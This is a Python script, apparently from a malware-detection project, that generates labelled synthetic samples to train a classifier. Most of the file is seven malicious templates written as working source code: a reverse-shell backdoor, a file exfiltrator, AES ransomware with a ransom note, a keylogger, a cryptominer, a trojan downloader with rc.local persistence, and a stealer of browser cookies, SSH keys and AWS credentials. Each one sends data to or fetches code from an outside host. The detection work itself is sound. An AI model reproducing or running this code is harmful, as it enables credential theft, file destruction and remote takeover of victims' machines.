# ========================================
# tier2_data_generator.py
# Generate training data cho Tier 2
# CHẠY FILE NÀY TRÊN LOCAL ĐỂ TẠO DATA
# ========================================

"""
Thư viện cần cài:
pip install numpy pandas --break-system-packages
"""

import numpy as np
import pandas as pd
from pathlib import Path
import json
from typing import List, Dict
import random

# Import components
import sys

from component_a_static import EnhancedStaticAnalyzer
from component_b_obfuscation import ObfuscationDetector
from component_c_behavioral import BehavioralPatternAnalyzer

class Tier2DataGenerator:
    """
    Generate training data cho Tier 2
    Tạo synthetic malicious và benign Python code samples
    """
    
    def __init__(self, output_dir: str = './tier2_training_data'):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        
        # Initialize analyzers
        self.analyzer_a = EnhancedStaticAnalyzer()
        self.analyzer_b = ObfuscationDetector()
        self.analyzer_c = BehavioralPatternAnalyzer()
        
        # Malicious code templates
        self.malicious_templates = [
            self._template_backdoor,
            self._template_data_exfil,
            self._template_ransomware,
            self._template_keylogger,
            self._template_cryptominer,
            self._template_trojan_downloader,
            self._template_info_stealer,
        ]
        
        # Benign code templates
        self.benign_templates = [
            self._template_web_scraper,
            self._template_data_analysis,
            self._template_api_client,
            self._template_file_processor,
            self._template_calculator,
        ]
    
    # ========== MALICIOUS TEMPLATES ==========
    
    def _template_backdoor(self) -> str:
        """Backdoor template"""
        code = f'''
import socket
import os
import base64
import subprocess

def establish_connection():
    host = "{self._random_ip()}"
    port = {random.randint(1000, 9999)}
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def execute_commands(conn):
    while True:
        cmd = conn.recv(1024).decode()
        
        if cmd.startswith("download"):
            filename = cmd.split()[1]
            with open(filename, 'rb') as f:
                data = f.read()
            conn.send(base64.b64encode(data))
        
        elif cmd.startswith("exec"):
            code = base64.b64decode(cmd.split()[1])
            exec(code)
        
        else:
            result = subprocess.run(cmd, shell=True, capture_output=True)
            conn.send(result.stdout)

if __name__ == "__main__":
    conn = establish_connection()
    execute_commands(conn)
'''
        return code
    
    def _template_data_exfil(self) -> str:
        """Data exfiltration template"""
        code = f'''
import os
import requests
import json
from pathlib import Path

def collect_sensitive_files():
    sensitive_dirs = [
        os.path.expanduser("~/.ssh"),
        os.path.expanduser("~/.aws"),
        os.path.expanduser("~/Documents"),
    ]
    
    files = []
    for directory in sensitive_dirs:
        if os.path.exists(directory):
            for root, dirs, filenames in os.walk(directory):
                for filename in filenames:
                    if any(filename.endswith(ext) for ext in ['.txt', '.doc', '.pdf', '.key']):
                        filepath = os.path.join(root, filename)
                        files.append(filepath)
    
    return files

def exfiltrate_data(files):
    c2_server = "http://{self._random_ip()}:8080/upload"
    
    for filepath in files:
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            
            payload = {{
                'filename': os.path.basename(filepath),
                'data': data.hex()
            }}
            
            requests.post(c2_server, json=payload)
        except:
            pass

if __name__ == "__main__":
    files = collect_sensitive_files()
    exfiltrate_data(files)
'''
        return code
    
    def _template_ransomware(self) -> str:
        """Ransomware template"""
        code = f'''
import os
from Crypto.Cipher import AES
import base64
import hashlib

def generate_key():
    return hashlib.sha256(b"malicious_key_{random.randint(1000, 9999)}").digest()

def encrypt_file(filepath, key):
    cipher = AES.new(key, AES.MODE_EAX)
    
    with open(filepath, 'rb') as f:
        data = f.read()
    
    ciphertext, tag = cipher.encrypt_and_digest(data)
    
    with open(filepath + '.encrypted', 'wb') as f:
        f.write(cipher.nonce + tag + ciphertext)
    
    os.remove(filepath)

def encrypt_directory(directory, key):
    for root, dirs, files in os.walk(directory):
        for filename in files:
            if not filename.endswith('.encrypted'):
                filepath = os.path.join(root, filename)
                try:
                    encrypt_file(filepath, key)
                except:
                    pass

def create_ransom_note():
    note = """
    YOUR FILES HAVE BEEN ENCRYPTED!
    
    Send {random.randint(500, 2000)} USD in Bitcoin to:
    {self._random_bitcoin_address()}
    
    Then email us at: decrypt@evil.com
    """
    
    with open("RANSOM_NOTE.txt", "w") as f:
        f.write(note)

if __name__ == "__main__":
    key = generate_key()
    target_dir = os.path.expanduser("~/Documents")
    encrypt_directory(target_dir, key)
    create_ransom_note()
'''
        return code
    
    def _template_keylogger(self) -> str:
        """Keylogger template"""
        code = f'''
from pynput import keyboard
import requests
import time
from datetime import datetime

class Keylogger:
    def __init__(self):
        self.log = []
        self.c2_server = "http://{self._random_ip()}:8080/logs"
    
    def on_press(self, key):
        try:
            self.log.append(key.char)
        except AttributeError:
            self.log.append(str(key))
        
        if len(self.log) >= 50:
            self.send_logs()
    
    def send_logs(self):
        data = {{
            'timestamp': datetime.now().isoformat(),
            'keystrokes': ''.join(self.log)
        }}
        
        try:
            requests.post(self.c2_server, json=data)
            self.log = []
        except:
            pass
    
    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    logger = Keylogger()
    logger.start()
'''
        return code
    
    def _template_cryptominer(self) -> str:
        """Cryptominer template"""
        code = f'''
import socket
import json
import hashlib
import time

class CryptoMiner:
    def __init__(self):
        self.pool_address = "{self._random_ip()}"
        self.pool_port = {random.randint(3000, 4000)}
        self.wallet = "{self._random_bitcoin_address()}"
    
    def connect_to_pool(self):
        s = socket.socket()
        s.connect((self.pool_address, self.pool_port))
        
        login = {{
            'method': 'login',
            'params': {{
                'login': self.wallet,
                'pass': 'x'
            }}
        }}
        
        s.send(json.dumps(login).encode())
        return s
    
    def mine(self, connection):
        while True:
            # Simulate mining
            data = connection.recv(1024).decode()
            job = json.loads(data)
            
            # Calculate hash
            nonce = 0
            while nonce < 1000000:
                hash_input = job['blob'] + str(nonce)
                result = hashlib.sha256(hash_input.encode()).hexdigest()
                
                if result.startswith('0000'):
                    # Submit share
                    share = {{
                        'method': 'submit',
                        'params': {{
                            'id': job['id'],
                            'job_id': job['job_id'],
                            'nonce': nonce,
                            'result': result
                        }}
                    }}
                    connection.send(json.dumps(share).encode())
                    break
                
                nonce += 1
            
            time.sleep(0.1)

if __name__ == "__main__":
    miner = CryptoMiner()
    conn = miner.connect_to_pool()
    miner.mine(conn)
'''
        return code
    
    def _template_trojan_downloader(self) -> str:
        """Trojan downloader template"""
        code = f'''
import requests
import os
import subprocess
import base64

def download_payload():
    urls = [
        "http://{self._random_ip()}/payload1.exe",
        "http://{self._random_ip()}/payload2.dll",
    ]
    
    payloads = []
    
    for url in urls:
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                payloads.append(response.content)
        except:
            pass
    
    return payloads

def execute_payloads(payloads):
    temp_dir = "/tmp" if os.name != 'nt' else "C:\\\\Temp"
    
    for i, payload in enumerate(payloads):
        filename = os.path.join(temp_dir, f"update{{i}}.exe") # type: ignore
        
        with open(filename, 'wb') as f:
            f.write(payload)
        
        os.chmod(filename, 0o755)
        subprocess.Popen([filename])

def establish_persistence():
    script_path = os.path.abspath(__file__)
    
    if os.name != 'nt':
        rc_local = "/etc/rc.local"
        with open(rc_local, 'a') as f:
            f.write(f"python3 {{script_path}} &\\n")
        os.chmod(rc_local, 0o755)

if __name__ == "__main__":
    payloads = download_payload()
    execute_payloads(payloads)
    establish_persistence()
'''
        return code
    
    def _template_info_stealer(self) -> str:
        """Info stealer template"""
        code = f'''
import os
import json
import sqlite3
import requests
from pathlib import Path

def steal_browser_data():
    data = {{}}
    
    # Chrome cookies
    chrome_path = os.path.expanduser("~/.config/google-chrome/Default/Cookies")
    if os.path.exists(chrome_path):
        conn = sqlite3.connect(chrome_path)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, value FROM cookies")
        data['chrome_cookies'] = cursor.fetchall()
        conn.close()
    
    # Firefox passwords
    firefox_path = os.path.expanduser("~/.mozilla/firefox")
    if os.path.exists(firefox_path):
        data['firefox_profiles'] = os.listdir(firefox_path)
    
    return data

def steal_credentials():
    creds = []
    
    # SSH keys
    ssh_dir = os.path.expanduser("~/.ssh")
    if os.path.exists(ssh_dir):
        for filename in os.listdir(ssh_dir):
            if filename.endswith(('id_rsa', 'id_ed25519')):
                filepath = os.path.join(ssh_dir, filename)
                with open(filepath, 'r') as f:
                    creds.append({{
                        'type': 'ssh_key',
                        'content': f.read()
                    }})
    
    # AWS credentials
    aws_path = os.path.expanduser("~/.aws/credentials")
    if os.path.exists(aws_path):
        with open(aws_path, 'r') as f:
            creds.append({{
                'type': 'aws_credentials',
                'content': f.read()
            }})
    
    return creds

def exfiltrate(data):
    c2_server = "http://{self._random_ip()}:8080/stolen"
    
    payload = {{
        'browser_data': data.get('browser_data'),
        'credentials': data.get('credentials'),
        'hostname': os.uname().nodename
    }}
    
    requests.post(c2_server, json=payload)

if __name__ == "__main__":
    stolen_data = {{
        'browser_data': steal_browser_data(),
        'credentials': steal_credentials()
    }}
    exfiltrate(stolen_data)
'''
        return code
    
    # ========== BENIGN TEMPLATES ==========
    
    def _template_web_scraper(self) -> str:
        """Benign web scraper"""
        code = '''
import requests
from bs4 import BeautifulSoup
import csv

def scrape_website(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    
    articles = []
    for article in soup.find_all('article'):
        title = article.find('h2').text if article.find('h2') else ''
        link = article.find('a')['href'] if article.find('a') else ''
        
        articles.append({
            'title': title,
            'link': link
        })
    
    return articles

def save_to_csv(articles, filename):
    with open(filename, 'w', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=['title', 'link'])
        writer.writeheader()
        writer.writerows(articles)

if __name__ == "__main__":
    url = "https://example.com/blog"
    articles = scrape_website(url)
    save_to_csv(articles, 'articles.csv')
'''
        return code
    
    def _template_data_analysis(self) -> str:
        """Benign data analysis"""
        code = '''
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt

def load_data(filepath):
    return pd.read_csv(filepath)

def analyze_data(df):
    summary = {
        'mean': df.mean(),
        'std': df.std(),
        'min': df.min(),
        'max': df.max()
    }
    return summary

def create_visualizations(df):
    fig, axes = plt.subplots(2, 2, figsize=(12, 10))
    
    df.hist(ax=axes[0, 0])
    df.plot(kind='box', ax=axes[0, 1])
    df.plot(kind='line', ax=axes[1, 0])
    df.corr().plot(kind='bar', ax=axes[1, 1])
    
    plt.savefig('analysis_results.png')

if __name__ == "__main__":
    df = load_data('data.csv')
    summary = analyze_data(df)
    create_visualizations(df)
    print(summary)
'''
        return code
    
    def _template_api_client(self) -> str:
        """Benign API client"""
        code = '''
import requests
import json

class APIClient:
    def __init__(self, base_url, api_key):
        self.base_url = base_url
        self.headers = {
            'Authorization': f'Bearer {api_key}',
            'Content-Type': 'application/json'
        }
    
    def get(self, endpoint):
        url = f"{self.base_url}/{endpoint}"
        response = requests.get(url, headers=self.headers)
        return response.json()
    
    def post(self, endpoint, data):
        url = f"{self.base_url}/{endpoint}"
        response = requests.post(url, headers=self.headers, json=data)
        return response.json()
    
    def list_resources(self):
        return self.get('resources')
    
    def create_resource(self, name, description):
        data = {
            'name': name,
            'description': description
        }
        return self.post('resources', data)

if __name__ == "__main__":
    client = APIClient('https://api.example.com', 'your_api_key')
    resources = client.list_resources()
    print(json.dumps(resources, indent=2))
'''
        return code
    
    def _template_file_processor(self) -> str:
        """Benign file processor"""
        code = '''
import os
from pathlib import Path
import shutil

def process_files(input_dir, output_dir):
    Path(output_dir).mkdir(exist_ok=True)
    
    for root, dirs, files in os.walk(input_dir):
        for filename in files:
            if filename.endswith('.txt'):
                input_path = os.path.join(root, filename)
                output_path = os.path.join(output_dir, filename)
                
                with open(input_path, 'r') as infile:
                    content = infile.read()
                
                # Process content
                processed = content.upper()
                
                with open(output_path, 'w') as outfile:
                    outfile.write(processed)

def organize_by_extension(directory):
    for filename in os.listdir(directory):
        filepath = os.path.join(directory, filename)
        
        if os.path.isfile(filepath):
            ext = Path(filename).suffix[1:]
            ext_dir = os.path.join(directory, ext)
            
            Path(ext_dir).mkdir(exist_ok=True)
            shutil.move(filepath, os.path.join(ext_dir, filename))

if __name__ == "__main__":
    process_files('./input', './output')
    organize_by_extension('./files')
'''
        return code
    
    def _template_calculator(self) -> str:
        """Benign calculator"""
        code = '''
import math

class Calculator:
    def __init__(self):
        self.memory = 0
    
    def add(self, a, b):
        return a + b
    
    def subtract(self, a, b):
        return a - b
    
    def multiply(self, a, b):
        return a * b
    
    def divide(self, a, b):
        if b == 0:
            raise ValueError("Cannot divide by zero")
        return a / b
    
    def power(self, base, exponent):
        return math.pow(base, exponent)
    
    def sqrt(self, n):
        return math.sqrt(n)
    
    def store(self, value):
        self.memory = value
    
    def recall(self):
        return self.memory

if __name__ == "__main__":
    calc = Calculator()
    print(f"5 + 3 = {calc.add(5, 3)}")
    print(f"10 - 4 = {calc.subtract(10, 4)}")
    print(f"6 * 7 = {calc.multiply(6, 7)}")
    print(f"15 / 3 = {calc.divide(15, 3)}")
    print(f"2 ^ 8 = {calc.power(2, 8)}")
    print(f"sqrt(16) = {calc.sqrt(16)}")
'''
        return code
    
    # ========== HELPER FUNCTIONS ==========
    
    def _random_ip(self) -> str:
        return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    
    def _random_bitcoin_address(self) -> str:
        chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
        return '1' + ''.join(random.choices(chars, k=33))
    
    # ========== MAIN GENERATION ==========
    
    def generate_samples(self, num_malicious: int = 500, num_benign: int = 500):
        """
        Generate training samples
        """
        print(f"\n{'='*60}")
        print("TIER 2 DATA GENERATION")
        print(f"{'='*60}")
        print(f"\nGenerating {num_malicious} malicious + {num_benign} benign samples...")
        
        samples = []
        
        # Generate malicious samples
        print("\n[1/2] Generating malicious samples...")
        for i in range(num_malicious):
            template = random.choice(self.malicious_templates)
            code = template()
            
            # Save code to temp file
            temp_file = self.output_dir / f'malicious_{i}.py'
            with open(temp_file, 'w') as f:
                f.write(code)
            
            # Analyze with all components
            try:
                analysis_a = self.analyzer_a.analyze_file(temp_file)
                analysis_b = self.analyzer_b.analyze_file(temp_file)
                analysis_c = self.analyzer_c.analyze_file(temp_file)
                
                # Extract features
                features_a = self.analyzer_a.extract_features_vector(analysis_a)
                features_b = self.analyzer_b.extract_features_vector(analysis_b)
                features_c = self.analyzer_c.extract_features_vector(analysis_c)
                
                # Combine features
                combined = {**features_a, **features_b, **features_c}
                combined['label'] = 1  # Malicious
                
                samples.append(combined)
                
            except Exception as e:
                print(f"  ⚠️ Error analyzing malicious_{i}: {e}")
            
            # Cleanup
            temp_file.unlink()
            
            if (i + 1) % 100 == 0:
                print(f"  Generated {i + 1}/{num_malicious} malicious samples")
        
        # Generate benign samples
        print("\n[2/2] Generating benign samples...")
        for i in range(num_benign):
            template = random.choice(self.benign_templates)
            code = template()
            
            # Save code to temp file
            temp_file = self.output_dir / f'benign_{i}.py'
            with open(temp_file, 'w') as f:
                f.write(code)
            
            # Analyze with all components
            try:
                analysis_a = self.analyzer_a.analyze_file(temp_file)
                analysis_b = self.analyzer_b.analyze_file(temp_file)
                analysis_c = self.analyzer_c.analyze_file(temp_file)
                
                # Extract features
                features_a = self.analyzer_a.extract_features_vector(analysis_a)
                features_b = self.analyzer_b.extract_features_vector(analysis_b)
                features_c = self.analyzer_c.extract_features_vector(analysis_c)
                
                # Combine features
                combined = {**features_a, **features_b, **features_c}
                combined['label'] = 0  # Benign
                
                samples.append(combined)
                
            except Exception as e:
                print(f"  ⚠️ Error analyzing benign_{i}: {e}")
            
            # Cleanup
            temp_file.unlink()
            
            if (i + 1) % 100 == 0:
                print(f"  Generated {i + 1}/{num_benign} benign samples")
        
        # Create DataFrame
        df = pd.DataFrame(samples)
        
        # Save to CSV
        output_file = self.output_dir / 'tier2_training_data.csv'
        df.to_csv(output_file, index=False)
        
        print(f"\n{'='*60}")
        print("DATA GENERATION COMPLETE")
        print(f"{'='*60}")
        print(f"✓ Generated {len(samples)} total samples")
        print(f"✓ Malicious: {sum(df['label'] == 1)}")
        print(f"✓ Benign: {sum(df['label'] == 0)}")
        print(f"✓ Features: {len(df.columns) - 1}")
        print(f"✓ Saved to: {output_file}")
        
        # Print feature summary
        print(f"\n{'='*60}")
        print("FEATURE SUMMARY")
        print(f"{'='*60}")
        print(df.describe())
        
        return df


# ===== MAIN =====
if __name__ == '__main__':
    generator = Tier2DataGenerator()
    
    # Generate data
    df = generator.generate_samples(
        num_malicious=500,
        num_benign=500
    )
    
    print("\n✅ Training data ready!")
    print("Next step: Upload tier2_training_data.csv to Google Colab for training")